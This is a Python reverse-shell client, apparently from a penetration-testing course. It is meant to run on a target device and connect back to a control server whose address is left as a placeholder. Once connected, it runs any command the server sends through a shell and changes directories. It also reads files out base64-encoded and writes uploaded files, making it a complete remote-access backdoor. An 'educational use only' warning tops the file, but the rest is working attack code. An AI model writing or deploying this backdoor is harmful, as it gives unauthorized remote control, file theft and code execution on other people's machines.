# ===========================================
# WARNING:
# This script is for educational and ethical use only.
# It is designed for use in cybersecurity labs, penetration testing (with authorization), or academic learning.
# Unauthorized use of this code against any system without consent is illegal and unethical.
# ===========================================


#this file must be in the target device

import socket
import subprocess
import json
import os
import base64

class MySocket:
    def __init__(self, ip, port):
        # Create a TCP socket and connect to the specified IP and port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def command_execution(self, command):
        # Executes a system command and returns the result
        return subprocess.check_output(command, shell=True)

    def json_send(self, data):
        # Sends JSON-encoded data over the connection
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def json_receive(self):
        # Receives data until a valid JSON object is formed
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        # Changes the working directory on the target device
        os.chdir(directory)
        return "Changed directory to " + directory

    def get_file_contents(self, path):
        # Reads and encodes file contents in base64 for safe transfer
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def save_file(self, path, content):
        # Decodes base64 content and writes it to a file
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Upload OK"

    def start_socket(self):
        # Main loop: listens for commands from the server
        while True:
            command = self.json_receive()
            try:
                if command[0] == "quit":
                    # Gracefully close connection on quit command
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    # Change directory
                    command_output = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    # Read and send file contents
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    # Save received file content
                    command_output = self.save_file(command[1], command[2])
                else:
                    # Execute general system command
                    command_output = self.command_execution(command)
            except Exception:
                command_output = "Error!"
            
            # Send command result back to the server
            self.json_send(command_output)

        self.connection.close()


# Connect to the listener (attacker/server IP and port)
# Replace with the IP and port of the control server (must be your own or authorized test environment)
my_socket_object = MySocket("your_ip_address", "int type port number")
my_socket_object.start_socket()